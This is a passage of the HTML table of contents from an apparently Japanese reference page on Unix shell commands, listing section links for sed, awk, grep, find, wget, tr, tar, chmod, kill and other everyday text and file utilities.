<li><a href=#awk-文中の４つ目のfooだけをbarに置換>awk 文中の４つ目のfooだけをbarに置換</a></li>
<li><a href=#sed-文中のすべてのfooをbarに置換>sed 文中のすべてのfooをbarに置換</a></li>
<li><a href=#awk-文中のすべてのfooをbarに置換>awk 文中のすべてのfooをbarに置換</a></li>
<li><a href=#sed-文中にある複数のfooの最後から二つ目のみをbarに置換>sed 文中にある複数のfooの最後から二つ目のみをbarに置換</a></li>
<li><a href=#sed-文中にある複数のfooの最後のfooだけをbarに置換>sed 文中にある複数のfooの最後のfooだけをbarに置換</a></li>
</ol>
</li>
<li><a href=#行や段落の操作>行や段落の操作</a>
<ol>
<li><a href=#tac-行の逆順catの逆>tac 行の逆順（catの逆）</a></li>
<li><a href=#sed-行の逆順catの逆>sed 行の逆順（catの逆）</a></li>
<li><a href=#sed-行の逆順catの逆-1>sed 行の逆順（catの逆）</a></li>
<li><a href=#awk-行の逆順catの逆>awk 行の逆順（catの逆）</a></li>
<li><a href=#perl-行の逆順catの逆>perl 行の逆順（catの逆）</a></li>
<li><a href=#rev-行の各文字を反転します>rev 行の各文字を反転します。</a></li>
<li><a href=#sed-行の各文字を反転します>sed 行の各文字を反転します。</a></li>
<li><a href=#perl-行の各文字を反転します>perl 行の各文字を反転します。</a></li>
<li><a href=#sed-行を水平方向に結合>sed 行を水平方向に結合</a></li>
<li><a href=#gsed-5行ごとに空白行を追加5101520-行などの後>gsed 5行ごとに空白行を追加(5、10、15、20 行などの後)</a></li>
<li><a href=#sed-5行ごとに空白行を追加5101520-行などの後>sed 5行ごとに空白行を追加(5、10、15、20 行などの後)</a></li>
</ol>
</li>
<li><a href=#ファイル操作>ファイル操作</a>
<ol>
<li><a href=#rename-すべてのファイルの名前を変更します>rename すべてのファイルの名前を変更します</a></li>
<li><a href=#rename-すべてのファイルにファイル拡張子を追加します-例-txt-を追加>rename すべてのファイルにファイル拡張子を追加します (例: .txt を追加)</a></li>
<li><a href=#paste-ファイルの行を並べて結合>paste ファイルの行を並べて結合</a></li>
<li><a href=#paste-2つ以上のファイルを列に結合貼り付けます-例-fileafilebfilec>paste 2つ以上のファイルを列に結合/貼り付けます (例: fileA、fileB、fileC)</a></li>
<li><a href=#perl-各ファイル名の文字列の名前の部分aaaをbbbに変更します>perl 各ファイル名の文字列の名前の部分aaaをbbbに変更します。</a></li>
</ol>
</li>
<li><a href=#条件出力>条件出力</a>
<ol>
<li><a href=#head-sed-awk-最初の-10-行を出力>head sed awk 最初の 10 行を出力</a></li>
<li><a href=#awk-文字列を含む行出力しない-例-bbo>awk 文字列を含む行出力しない (例: &lsquo;bbo&rsquo;)</a></li>
<li><a href=#head-sed-awk-最初の行を出力>head sed awk 最初の行を出力</a></li>
<li><a href=#tail-sed-最後の-10-行を出力>tail sed 最後の 10 行を出力</a></li>
<li><a href=#tail-sed-awk-最後の-2-行を出力>tail sed awk 最後の 2 行を出力</a></li>
<li><a href=#tail-sed-awk-最後の行を出力>tail sed awk 最後の行を出力</a></li>
<li><a href=#sed-最終行の次の行を出力>sed 最終行の次の行を出力</a></li>
<li><a href=#sed-最後に列を追加>sed 最後に列を追加</a></li>
</ol>
</li>
<li><a href=#条件検索正規表現>条件検索・正規表現</a>
<ol>
<li><a href=#grep-sed-awk-正規表現に一致する行のみを出力>grep sed awk 正規表現に一致する行のみを出力</a></li>
<li><a href=#grep-sed-awk-正規表現に一致しない行のみを出力>grep sed awk 正規表現に一致しない行のみを出力:</a></li>
<li><a href=#grep-空行をカウントする>grep 空行をカウントする</a></li>
<li><a href=#grep-単語とマッチしない行を表示-例-bbo>grep 単語とマッチしない行を表示 (例: &lsquo;bbo&rsquo;)</a></li>
<li><a href=#grep-一致する行番号を返す-検索文字列は例-bbo>grep 一致する行番号を返す 検索文字列は(例: &lsquo;bbo&rsquo;)</a></li>
<li><a href=#grep-特定の文字列で始まらない行を表示-例->grep 特定の文字列で始まらない行を表示 (例: #)</a></li>
<li><a href=#grep-大文字と小文字を区別しない-grep-例-bbobbobbo>grep 大文字と小文字を区別しない grep (例: &lsquo;bbo&rsquo;/&lsquo;BBO&rsquo;/&lsquo;Bbo&rsquo;)</a></li>
<li><a href=#grep-マッチに色を付けます-例-bbo>grep マッチに色を付けます (例: &lsquo;bbo&rsquo;)!</a></li>
<li><a href=#sed-特定の行を出力-例-123-行目>sed 特定の行を出力 (例: 123 行目)</a></li>
<li><a href=#sed-行数を出力します-例-10-行目から-33-行目>sed 行数を出力します (例: 10 行目から 33 行目)</a></li>
<li><a href=#sed-n行ごとに出力する>sed n行ごとに出力する</a></li>
<li><a href=#sed-奇数行ごとに出力>sed 奇数行ごとに出力</a></li>
<li><a href=#sed-最初の行を含めて-3-行ごとに出力する>sed 最初の行を含めて 3 行ごとに出力する</a></li>
<li><a href=#sed-awk-正規表現の直前の行を出力>sed awk 正規表現の直前の行を出力</a></li>
<li><a href=#sed-awk-正規表現の直後の行を出力>sed awk 正規表現の直後の行を出力</a></li>
<li><a href=#grep-sed-正規表現の前後１行のコンテキストを行番号付きで出力>grep sed 正規表現の前後１行のコンテキストを行番号付きで出力</a></li>
<li><a href=#sed-awk-aaa-と-bbb-と-ccc-を検索します-任意の順序で>sed awk AAA と BBB と CCC を検索します (任意の順序で):</a></li>
<li><a href=#sed-awk-aaabbbcccこの順序でを含む行を検索します>sed awk AAA、BBB、CCC(この順序で)を含む行を検索します。</a></li>
<li><a href=#egrep-grep-sed-aaabbbまたはcccを検索します>egrep grep sed AAA、BBBまたはCCCを検索します。</a></li>
<li><a href=#sed-aaaが含まれている段落を出力>sed AAAが含まれている段落を出力</a></li>
<li><a href=#sed-段落aaaに-bbbとccc任意の順序でが含まれている段落を出力>sed 段落AAAに BBBとCCC(任意の順序で)が含まれている段落を出力</a></li>
<li><a href=#sed-gsed-aaabbbまたはcccが含まれている段落を出力>sed gsed AAA、BBBまたはCCCが含まれている段落を出力</a></li>
<li><a href=#sed-awk-65-文字以上の行を出力>sed awk 65 文字以上の行を出力</a></li>
<li><a href=#sed-awk-65-文字未満の行のみを出力>sed awk 65 文字未満の行のみを出力</a></li>
<li><a href=#sed-awk-正規表現から最後までのセクションを出力>sed awk 正規表現から最後までのセクションを出力</a></li>
<li><a href=#sed-awk-perl-行番号に基づいてセクションを出力>sed awk perl 行番号に基づいてセクションを出力</a></li>
<li><a href=#sed-awk-行番号-52-を出力>sed awk 行番号 52 を出力</a></li>
<li><a href=#gsed-sed-３行目から-７行ごとに出力>gsed sed ３行目から ７行ごとに出力</a></li>
<li><a href=#sed-awk-perl-2-つの正規表現の間のセクションを出力>sed awk perl 2 つの正規表現の間のセクションを出力</a></li>
<li><a href=#sed-perl-2-つの正規表現の間のセクションを除くすべてを出力>sed perl 2 つの正規表現の間のセクションを除くすべてを出力</a></li>
<li><a href=#awk-列を正規表現と照合>awk 列を正規表現と照合</a></li>
<li><a href=#awk-５番目の列が条件にあっていれば出力>awk ５番目の列が条件にあっていれば出力</a></li>
<li><a href=#awk-５番目の列が条件にあっていなければ出力>awk ５番目の列が条件にあっていなければ出力</a></li>
</ol>
</li>
<li><a href=#重複の扱い>重複の扱い</a>
<ol>
<li><a href=#uniq-sed-awk-重複する連続した行を削除します>uniq sed awk 重複する連続した行を削除します。</a></li>
<li><a href=#sed-awk-重複が連続していない行を削除>sed awk 重複が連続していない行を削除</a></li>
<li><a href=#uniq-sed-重複する行を除くすべての行を削除>uniq sed 重複する行を除くすべての行を削除</a></li>
</ol>
</li>
<li><a href=#行削除>行削除</a>
<ol>
<li><a href=#tail-awk-最初の行を削除>tail awk 最初の行を削除</a></li>
<li><a href=#sed-awk-perl-最初の-10-行を削除>sed awk perl 最初の 10 行を削除</a></li>
<li><a href=#awk-sed-5-行目を削除>awk sed 5 行目を削除</a></li>
<li><a href=#awk-sed-5から10-といった範囲の行を削除>awk sed 5から10 といった範囲の行を削除</a></li>
<li><a href=#sed-最後の行を削除します>sed 最後の行を削除します。</a></li>
<li><a href=#sed-最後の-2-行を削除します>sed 最後の 2 行を削除します</a></li>
<li><a href=#sed-最後の-10-行を削除します>sed 最後の 10 行を削除します。</a></li>
<li><a href=#gsed-sed-8-行ごとに削除します>gsed sed 8 行ごとに削除します</a></li>
<li><a href=#sed-パターンに一致する行を削除>sed パターンに一致する行を削除</a></li>
<li><a href=#grep-sed-awk-空行をすべて削除>grep sed awk 空行をすべて削除</a></li>
<li><a href=#cat-sed-最初の空白行を除く連続する空白行を削除し先頭と末尾のすべての空白行も削除>cat sed 最初の空白行を除く連続する空白行を削除し、先頭と末尾のすべての空白行も削除</a></li>
<li><a href=#sed-最初の-2-行を除く連続する空白行をすべて削除>sed 最初の 2 行を除く連続する空白行をすべて削除</a></li>
<li><a href=#sed-先頭の空白行をすべて削除>sed 先頭の空白行をすべて削除</a></li>
<li><a href=#sed-末尾の空白行をすべて削除>sed 末尾の空白行をすべて削除</a></li>
<li><a href=#sed-各段落の最後の行を削除>sed 各段落の最後の行を削除</a></li>
<li><a href=#sed-文字列を含む行を削除-例-bbo>sed 文字列を含む行を削除 (例: &lsquo;bbo&rsquo;)</a></li>
<li><a href=#sed-1行目を削除>sed 1行目を削除</a></li>
<li><a href=#sed-最初の１００行１行目から１００行目までを削除>sed 最初の１００行（１行目から１００行目まで）を削除</a></li>
<li><a href=#sed-空行の削除>sed 空行の削除</a></li>
<li><a href=#sed-最後の行を削除>sed 最後の行を削除</a></li>
<li><a href=#sed-ファイルの末尾から最後の文字を削除>sed ファイルの末尾から最後の文字を削除</a></li>
<li><a href=#sed-先頭の空白とタブを削除-1>sed 先頭の空白とタブを削除</a></li>
<li><a href=#sed-先頭の空白のみを削除>sed 先頭の空白のみを削除</a></li>
<li><a href=#sed-末尾のカンマを削除>sed 末尾のカンマを削除</a></li>
</ol>
</li>
<li><a href=#行挿入>行挿入</a>
<ol>
<li><a href=#sed-最初の行として挿入>sed 最初の行として挿入</a></li>
<li><a href=#sed-最初の行の後に-2-行目として-挿入>sed 最初の行の後に (2 行目として) 挿入</a></li>
<li><a href=#sed-aaa-を含む行の上に-bbb-を含む行を挿入>sed AAA を含む行の上に BBB を含む行を挿入</a></li>
</ol>
</li>
<li><a href=#文字列の作成>文字列の作成</a>
<ol>
<li><a href=#awk-特定の長さの文字列を作成します-例-513-スペースを生成>awk 特定の長さの文字列を作成します (例: 513 スペースを生成)</a></li>
<li><a href=#awk-特定の文字位置に特定の長さの文字列を挿入>awk 特定の文字位置に特定の長さの文字列を挿入</a></li>
</ol>
</li>
<li><a href=#ファイル検索>ファイル検索</a>
<ol>
<li><a href=#find-現在のディレクトリ内のすべてのサブディレクトリファイルを一覧表示>find 現在のディレクトリ内のすべてのサブディレクトリ/ファイルを一覧表示</a></li>
<li><a href=#find-現在のディレクトリの下にあるすべてのファイルを一覧表示>find 現在のディレクトリの下にあるすべてのファイルを一覧表示</a></li>
<li><a href=#find-現在のディレクトリの下にあるすべてのディレクトリを一覧表示>find 現在のディレクトリの下にあるすべてのディレクトリを一覧表示</a></li>
<li><a href=#find-現在のディレクトリの下にあるすべてのファイルを編集>find 現在のディレクトリの下にあるすべてのファイルを編集</a></li>
<li><a href=#find-ファイル名のみを検索して出力-例-mso>find ファイル名のみを検索して出力 (例: &ldquo;mso&rdquo;)</a></li>
<li><a href=#find-システム内の大きなファイルを見つける-例-4g>find システム内の大きなファイルを見つける (例: >4G)</a></li>
<li><a href=#find-サイズが-74-バイト未満のファイルを見つけて削除する>find サイズが 74 バイト未満のファイルを見つけて削除する</a></li>
<li><a href=#find-空の-0-バイト-ファイルを見つける>find 空の (0 バイト) ファイルを見つける</a></li>
<li><a href=#find-ディレクトリ内のすべてのファイルを再帰的にカウントする>find ディレクトリ内のすべてのファイルを再帰的にカウントする</a></li>
</ol>
</li>
<li><a href=#並べ替え>並べ替え</a>
<ol>
<li><a href=#sort-列ごとにファイルを並べ替え元の順序を維持する>sort 列ごとにファイルを並べ替え、元の順序を維持する</a></li>
</ol>
</li>
<li><a href=#折返し>折返し</a>
<ol>
<li><a href=#fold-指定された幅に収まるように各入力行を折り返す>fold 指定された幅に収まるように各入力行を折り返す</a></li>
</ol>
</li>
<li><a href=#タブの置換>タブの置換</a>
<ol>
<li><a href=#expand-タブをスペースに変換>expand タブをスペースに変換</a></li>
<li><a href=#unexpand-スペースをタブに変換>unexpand スペースをタブに変換</a></li>
</ol>
</li>
<li><a href=#webページをダウンロード>Webページをダウンロード</a>
<ol>
<li><a href=#wget-webページをダウンロード>wget Webページをダウンロード</a></li>
<li><a href=#wget-ファイル名を指定してダウンロード長い名前の場合>wget ファイル名を指定してダウンロード(長い名前の場合)</a></li>
<li><a href=#wget-ファイルをフォルダーに>wget ファイルをフォルダーに</a></li>
</ol>
</li>
<li><a href=#文字の削除と置換>文字の削除と置換</a>
<ol>
<li><a href=#tr-すべての非出力文字を削除>tr すべての非出力文字を削除</a></li>
<li><a href=#tr-改行を削除>tr 改行を削除</a></li>
<li><a href=#tr-改行を置換>tr 改行を置換</a></li>
<li><a href=#tr-大文字小文字へ>tr 大文字/小文字へ</a></li>
<li><a href=#tr-改行をスペースに変換します-1>tr 改行をスペースに変換します。</a></li>
<li><a href=#tr-crlf-を-lf-形式に変換します-1>tr CRLF を LF 形式に変換します。</a></li>
</ol>
</li>
<li><a href=#openssl>openssl</a>
<ol>
<li><a href=#16-進数の-md5-チェックサム値を-base64-エンコード形式に変換します>16 進数の MD5 チェックサム値を base64 エンコード形式に変換します。</a></li>
</ol>
</li>
<li><a href=#言語属性>言語属性</a>
<ol>
<li><a href=#アプリケーションが出力にデフォルト言語を使用することを強制します>アプリケーションが出力にデフォルト言語を使用することを強制します</a></li>
<li><a href=#文字列を-base64-文字列としてエンコードする>文字列を Base64 文字列としてエンコードする</a></li>
</ol>
</li>
<li><a href=#バッググラウンド処理>バッググラウンド処理</a>
<ol>
<li><a href=#バックグラウンドで複数のコマンドを実行する>バックグラウンドで複数のコマンドを実行する</a></li>
</ol>
</li>
<li><a href=#csv系>CSV系</a>
<ol>
<li><a href=#xls-を-csv-に変換>.xls を csv に変換</a></li>
</ol>
</li>
<li><a href=#ステータス処理>ステータス処理</a>
<ol>
<li><a href=#別のコマンドがゼロの終了ステータスを返す場合にのみコマンドを実行します-よくできました>別のコマンドがゼロの終了ステータスを返す場合にのみコマンドを実行します (よくできました)</a></li>
<li><a href=#別のコマンドがゼロ以外の終了ステータスを返した場合にのみコマンドを実行する-終了していない>別のコマンドがゼロ以外の終了ステータスを返した場合にのみコマンドを実行する (終了していない)</a></li>
</ol>
</li>
<li><a href=#圧縮解凍>圧縮・解凍</a>
<ol>
<li><a href=#tarbz2-ファイルを解凍します-例-filetarbz2>tar.bz2 ファイルを解凍します (例: file.tar.bz2)。</a></li>
<li><a href=#tarxz-ファイルを解凍します-例-filetarxz>tar.xz ファイルを解凍します (例: file.tar.xz)。</a></li>
<li><a href=#pdftotext>pdftotext</a></li>
<li><a href=#pdfをtxtに変換>PDFをtxtに変換</a></li>
</ol>
</li>
<li><a href=#catコマンド>catコマンド</a>
<ol>
<li><a href=#概要>概要</a></li>
<li><a href=#catコマンドの書式>catコマンドの書式</a></li>
<li><a href=#catコマンドの主なオプション>catコマンドの主なオプション</a></li>
<li><a href=#catコマンド詳細説明>catコマンド詳細説明</a></li>
<li><a href=#ファイルの内容を出力>ファイルの内容を出力</a></li>
<li><a href=#ファイルの結合>ファイルの結合</a></li>
</ol>
</li>
<li><a href=#echoコマンド>echoコマンド</a>
<ol>
<li><a href=#概要-1>概要</a></li>
<li><a href=#echoコマンドの書式>echoコマンドの書式</a></li>
<li><a href=#echoの主なオプション>echoの主なオプション</a></li>
<li><a href=#echo-コマンド詳細説明>echo コマンド詳細説明</a></li>
<li><a href=#hello-world>Hello World</a></li>
</ol>
</li>
<li><a href=#headコマンド>headコマンド</a>
<ol>
<li><a href=#概要-2>概要</a></li>
<li><a href=#headコマンドの書式>headコマンドの書式</a></li>
<li><a href=#headコマンドの主なオプション>headコマンドの主なオプション</a></li>
<li><a href=#headコマンド詳細説明>headコマンド詳細説明</a></li>
</ol>
</li>
<li><a href=#tailコマンド>tailコマンド</a>
<ol>
<li><a href=#概要-3>概要</a></li>
<li><a href=#tailコマンドの書式>tailコマンドの書式</a></li>
<li><a href=#tailコマンドの主なオプション>tailコマンドの主なオプション</a></li>
<li><a href=#tailコマンド詳細説明>tailコマンド詳細説明</a></li>
<li><a href=#tailコマンドでファイルの末尾部分だけを表示する>tailコマンドでファイルの末尾部分だけを表示する</a></li>
<li><a href=#ログファイルを監視する>ログファイルを監視する</a></li>
<li><a href=#ファイルの特定の範囲の行を取り出すheadとtail>ファイルの特定の範囲の行を取り出す（headとtail）</a></li>
</ol>
</li>
<li><a href=#lessコマンド>lessコマンド</a>
<ol>
<li><a href=#概要-4>概要</a></li>
<li><a href=#lessコマンドの書式>lessコマンドの書式</a></li>
<li><a href=#lessコマンドの主なオプション>lessコマンドの主なオプション</a></li>
<li><a href=#lessコマンド詳細説明>lessコマンド詳細説明</a></li>
<li><a href=#テキストを1画面ずつ表示する>テキストを1画面ずつ表示する</a></li>
<li><a href=#キー操作のヘルプを表示する>キー操作のヘルプを表示する</a></li>
<li><a href=#長い行を折り返さずに表示する>長い行を折り返さずに表示する</a></li>
</ol>
</li>
<li><a href=#moreコマンド>moreコマンド</a>
<ol>
<li><a href=#moreコマンド概要>moreコマンド概要</a></li>
<li><a href=#moreコマンドの書式>moreコマンドの書式</a></li>
<li><a href=#moreコマンドの主なオプション>moreコマンドの主なオプション</a></li>
<li><a href=#moreコマンド詳細説明>moreコマンド詳細説明</a></li>
</ol>
</li>
<li><a href=#killコマンド>killコマンド</a>
<ol>
<li><a href=#killコマンド概要>killコマンド概要</a></li>
<li><a href=#killコマンドの書式>killコマンドの書式</a></li>
<li><a href=#killコマンドの主なオプション>killコマンドの主なオプション</a></li>
<li><a href=#killコマンド詳細説明>killコマンド詳細説明</a></li>
<li><a href=#プロセスｉｄでプロセスを終了させる>プロセスＩＤでプロセスを終了させる</a></li>
<li><a href=#killallコマンドで名前を指定してプロセスを終了させる>killallコマンドで名前を指定してプロセスを終了させる</a></li>
<li><a href=#さまざまなプロセスの調べ方と終了方法>さまざまなプロセスの調べ方と終了方法</a></li>
</ol>
</li>
<li><a href=#fileコマンド>fileコマンド</a>
<ol>
<li><a href=#fileコマンド概要>fileコマンド概要</a></li>
<li><a href=#fileコマンドの書式>fileコマンドの書式</a></li>
<li><a href=#fileコマンドの主なオプション>fileコマンドの主なオプション</a></li>
<li><a href=#fileコマンド詳細説明>fileコマンド詳細説明</a></li>
<li><a href=#ファイルの形式を表示する>ファイルの形式を表示する</a></li>
<li><a href=#ファイルのリストから調べる>ファイルのリストから調べる</a></li>
<li><a href=#シンボリックリンクの参照先を調べる>シンボリックリンクの参照先を調べる</a></li>
<li><a href=#圧縮されているファイルを調べる>圧縮されているファイルを調べる</a></li>
</ol>
</li>
<li><a href=#chmodコマンド>chmodコマンド</a>
<ol>
<li><a href=#chmodコマンド概要>chmodコマンド概要</a></li>
<li><a href=#chmodコマンドの書式>chmodコマンドの書式</a></li>
<li><a href=#chmodコマンドの主なオプション>chmodコマンドの主なオプション</a></li>
<li><a href=#chmodコマンド詳細説明>chmodコマンド詳細説明</a></li>
<li><a href=#パーミッションを表すアルファベットと数値の意味>パーミッションを表すアルファベットと数値の意味</a></li>
<li><a href=#パーミッションを変更する>パーミッションを変更する</a></li>
<li><a href=#パーミッションの変更内容を確認するには>パーミッションの変更内容を確認するには？</a></li>
</ol>
</li>
<li><a href=#getoptsコマンド>getoptsコマンド</a>
<ol>
<li><a href=#getoptsコマンド概要>getoptsコマンド概要</a></li>
<li><a href=#getoptsコマンドの書式>getoptsコマンドの書式</a></li>
<li><a href=#getoptsコマンドの主なオプション>getoptsコマンドの主なオプション</a></li>
<li><a href=#getoptsコマンド詳細説明>getoptsコマンド詳細説明</a></li>
<li><a href=#オプションを解析する>オプションを解析する</a></li>
<li><a href=#エラーメッセージを表示しない>エラーメッセージを表示しない</a></li>
<li><a href=#引数付きのオプションを使用する>引数付きのオプションを使用する</a></li>
</ol>
</li>
<li><a href=#nkfコマンド>nkfコマンド</a>
<ol>
<li><a href=#nkfコマンド概要>nkfコマンド概要</a></li>
<li><a href=#nkfコマンドの書式>nkfコマンドの書式</a></li>
<li><a href=#nkfコマンドの主なオプション>nkfコマンドの主なオプション</a></li>
<li><a href=#nkfコマンド詳細説明>nkfコマンド詳細説明</a></li>
<li><a href=#文字コードと改行コードを変換する>文字コードと改行コードを変換する</a></li>
<li><a href=#文字コードを判定する>文字コードを判定する</a></li>
<li><a href=#文字コードを変換してファイルを書き換える>文字コードを変換してファイルを書き換える</a></li>
<li><a href=#centos-7にnkfをインストールするには>CentOS 7にnkfをインストールするには？</a></li>
</ol>
</li>
<li><a href=#if>if</a>
<ol>
<li><a href=#文字列一致の検出>文字列一致の検出</a></li>
<li><a href=#myfile-に文字列-test-が含まれているかどうかを確認>myfile に文字列 &lsquo;test&rsquo; が含まれているかどうかを確認</a></li>
<li><a href=#変数がnull-であるかを確認>変数がnull であるかを確認</a></li>
<li><a href=#該当のファイルが存在するかを確認>該当のファイルが存在するかを確認</a></li>
<li><a href=#ファイルに加えてシンボリックリンクの存在も確認>ファイルに加えてシンボリックリンクの存在も確認</a></li>
<li><a href=#xの値が５以上かどうかを確認>xの値が５以上かどうかを確認</a></li>
<li><a href=#bash版xの値が５以上かどうかを確認>bash版：xの値が５以上かどうかを確認</a></li>
<li><a href=#--を使う>(( )) を使う</a></li>
<li><a href=#--を使う-1>[[ ]] を使う</a></li>
</ol>
</li>
<li><a href=#for>for</a>
<ol>
<li><a href=#ディレクトリ内のファイル名を出力>ディレクトリ内のファイル名を出力</a></li>
<li><a href=#myfile内に記載された名前を使ってディレクトリを作成>myfile内に記載された名前を使ってディレクトリを作成</a></li>
</ol>
</li>
<li><a href=#read>read</a>
<ol>
<li><a href=#ユーザー入力の読み取り>ユーザー入力の読み取り</a></li>
</ol>
</li>
<li><a href=#配列>配列</a>
<ol>
<li><a href=#配列の宣言>配列の宣言</a></li>
</ol>
</li>
<li><a href=#trコマンド>trコマンド</a>
<ol>
<li><a href=#trコマンド概要>trコマンド概要</a></li>
<li><a href=#trコマンドの書式>trコマンドの書式</a></li>
<li><a href=#trコマンドの主なオプション>trコマンドの主なオプション</a></li>
<li><a href=#trコマンド詳細説明>trコマンド詳細説明</a></li>
<li><a href=#文字を置換する>文字を置換する</a></li>
<li><a href=#大文字小文字を変換する>大文字／小文字を変換する</a></li>
<li><a href=#改行を除去する>改行を除去する</a></li>
<li><a href=#固定長のデータをタブ区切りに変換するカンマ区切りに変換する>固定長のデータをタブ区切りに変換する／カンマ区切りに変換する</a></li>
</ol>
</li>
<li><a href=#dfコマンド>dfコマンド</a>
<ol>
<li><a href=#dfコマンド概要>dfコマンド概要</a></li>
<li><a href=#dfコマンドの書式>dfコマンドの書式</a></li>
<li><a href=#dfコマンドの主なオプション>dfコマンドの主なオプション</a></li>
<li><a href=#dfコマンド詳細説明>dfコマンド詳細説明</a></li>
<li><a href=#ディスクの空き容量を調べる>ディスクの空き容量を調べる</a></li>
</ol>
</li>
<li><a href=#duコマンド>duコマンド</a>
<ol>
<li><a href=#duコマンド概要>duコマンド概要</a></li>
<li><a href=#duコマンドの書式>duコマンドの書式</a></li>
<li><a href=#duコマンドの主なオプション>duコマンドの主なオプション</a></li>
<li><a href=#duコマンド詳細説明>duコマンド詳細説明</a></li>
<li><a href=#ディレクトリごとのディスク使用量を表示する>ディレクトリごとのディスク使用量を表示する</a></li>
<li><a href=#ディスク使用量の合計だけを表示する>ディスク使用量の合計だけを表示する</a></li>
<li><a href=#カレントディレクトリ直下のファイルディレクトリごとの集計を表示する>カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する</a></li>
</ol>
</li>
<li><a href=#cutコマンド>cutコマンド</a>
<ol>
<li><a href=#cutコマンド概要>cutコマンド概要</a></li>
<li><a href=#cutコマンドの書式>cutコマンドの書式</a></li>
<li><a href=#cutコマンドの主なオプション>cutコマンドの主なオプション</a></li>
<li><a href=#cutコマンド詳細説明>cutコマンド詳細説明</a></li>
<li><a href=#文字数を指定して切り出す>文字数を指定して切り出す</a></li>
<li><a href=#列を指定して切り出す>列を指定して切り出す</a></li>
</ol>
</li>
<li><a href=#expandコマンド>expandコマンド</a>
<ol>
<li><a href=#expandコマンド概要>expandコマンド概要</a></li>
<li><a href=#expandコマンドの書式>expandコマンドの書式</a></li>
<li><a href=#expandコマンドの主なオプション>expandコマンドの主なオプション</a></li>
<li><a href=#expandコマンド詳細説明>expandコマンド詳細説明</a></li>
<li><a href=#タブを空白に変換する>タブを空白に変換する</a></li>
<li><a href=#タブの幅を指定する>タブの幅を指定する</a></li>
</ol>
</li>
<li><a href=#tarコマンド>tarコマンド</a>
<ol>
<li><a href=#tarコマンド概要>tarコマンド概要</a></li>
<li><a href=#tarコマンドの書式>tarコマンドの書式</a></li>
<li><a href=#tarコマンドの主なオプション>tarコマンドの主なオプション</a></li>
<li><a href=#tarコマンド詳細説明>tarコマンド詳細説明</a></li>
<li><a href=#アーカイブファイルを作成する>アーカイブファイルを作成する</a></li>
<li><a href=#アーカイブファイルを展開する>アーカイブファイルを展開する</a></li>
</ol>
</li>
<li><a href=#wcコマンド>wcコマンド</a>
<ol>
<li><a href=#wcコマンド概要>wcコマンド概要</a></li>
<li><a href=#wcコマンドの書式>wcコマンドの書式</a></li>
<li><a href=#wcコマンドの主なオプション>wcコマンドの主なオプション</a></li>
<li><a href=#wcコマンド詳細説明>wcコマンド詳細説明</a></li>
<li><a href=#行数と単語数とバイト数を数える>行数と単語数とバイト数を数える</a></li>
<li><a href=#文字数を数える>文字数を数える</a></li>
<li><a href=#行数だけを表示する>行数だけを表示する</a></li>
</ol>
</li>
<li><a href=#jotコマンド>jotコマンド</a>
<ol>
<li><a href=#jotコマンド概要>jotコマンド概要</a></li>
<li><a href=#jotコマンドの書式>jotコマンドの書式</a></li>
<li><a href=#jotコマンドの主なオプション>jotコマンドの主なオプション</a></li>
<li><a href=#jotコマンド詳細説明>jotコマンド詳細説明</a></li>
<li><a href=#連番を作る>連番を作る</a></li>
<li><a href=#文字列と組み合わせた連番を作成する>文字列と組み合わせた連番を作成する</a></li>
<li><a href=#printf-のフォーマットで出力する>printf のフォーマットで出力する</a></li>
<li><a href=#連番の範囲を指定して出力する>連番の範囲を指定して出力する</a></li>
<li><a href=#乱数を出力する>乱数を出力する</a></li>
</ol>
</li>
<li><a href=#sortコマンド>sortコマンド</a>
<ol>
<li><a href=#sortコマンド概要>sortコマンド概要</a></li>
<li><a href=#sortコマンドの書式>sortコマンドの書式</a></li>
<li><a href=#sortコマンドの主なオプション>sortコマンドの主なオプション</a></li>
<li><a href=#sortコマンド詳細説明>sortコマンド詳細説明</a></li>
<li><a href=#テキストファイルを並べ替える>テキストファイルを並べ替える</a></li>
<li><a href=#数値の大小で並べ替える>数値の大小で並べ替える</a></li>
<li><a href=#列を指定して並べ替える>列を指定して並べ替える</a></li>
<li><a href=#csvデータを並べ替える>CSVデータを並べ替える</a></li>
</ol>
</li>
<li><a href=#revコマンド>revコマンド</a>
<ol>
<li><a href=#revコマンド概要>revコマンド概要</a></li>
<li><a href=#revコマンドの書式>revコマンドの書式</a></li>
<li><a href=#revコマンドの主なオプション>revコマンドの主なオプション</a></li>
<li><a href=#revコマンド詳細説明>revコマンド詳細説明</a></li>
<li><a href=#ファイルの各行を反転させる>ファイルの各行を反転させる</a></li>
</ol>
</li>
<li><a href=#seqコマンド>seqコマンド</a>
<ol>
<li><a href=#seqコマンド概要>seqコマンド概要</a></li>
<li><a href=#seqコマンドの書式>seqコマンドの書式</a></li>
<li><a href=#seqコマンドの主なオプション>seqコマンドの主なオプション</a></li>
<li><a href=#seqコマンド詳細説明>seqコマンド詳細説明</a></li>
<li><a href=#連続番号を出力する>連続番号を出力する</a></li>
<li><a href=#開始の数と間隔を指定する>開始の数と間隔を指定する</a></li>
<li><a href=#数字を逆順で出力する>数字を逆順で出力する</a></li>
<li><a href=#書式を指定して出力する>書式を指定して出力する</a></li>
</ol>
</li>
<li><a href=#tacコマンド>tacコマンド</a>
<ol>
<li><a href=#tacコマンド概要>tacコマンド概要</a></li>
<li><a href=#tacコマンドの書式>tacコマンドの書式</a></li>
<li><a href=#tacコマンドの主なオプション>tacコマンドの主なオプション</a></li>
<li><a href=#tacコマンド詳細説明>tacコマンド詳細説明</a></li>
<li><a href=#ファイルを最終行から逆順に出力する>ファイルを最終行から逆順に出力する</a></li>
</ol>
</li>
<li><a href=#uniqコマンド>uniqコマンド</a>
<ol>
<li><a href=#uniqコマンド概要>uniqコマンド概要</a></li>
<li><a href=#uniqコマンドの書式>uniqコマンドの書式</a></li>
<li><a href=#uniqコマンドの主なオプション>uniqコマンドの主なオプション</a></li>
<li><a href=#uniqコマンド詳細説明>uniqコマンド詳細説明</a></li>
<li><a href=#重複している行を削除する>重複している行を削除する</a></li>
<li><a href=#大文字小文字を区別しないで重複行を削除する>大文字／小文字を区別しないで重複行を削除する</a></li>
<li><a href=#重複している行をカウントする>重複している行をカウントする</a></li>
</ol>
</li>
<li><a href=#teeコマンド>teeコマンド</a>
<ol>
<li><a href=#teeコマンド概要>teeコマンド概要</a></li>
<li><a href=#teeコマンドの書式>teeコマンドの書式</a></li>
<li><a href=#teeコマンドの主なオプション>teeコマンドの主なオプション</a></li>
<li><a href=#teeコマンド詳細説明>teeコマンド詳細説明</a></li>
<li><a href=#ファイルへのリダイレクトとパイプを同時に行う>ファイルへのリダイレクトとパイプを同時に行う</a></li>
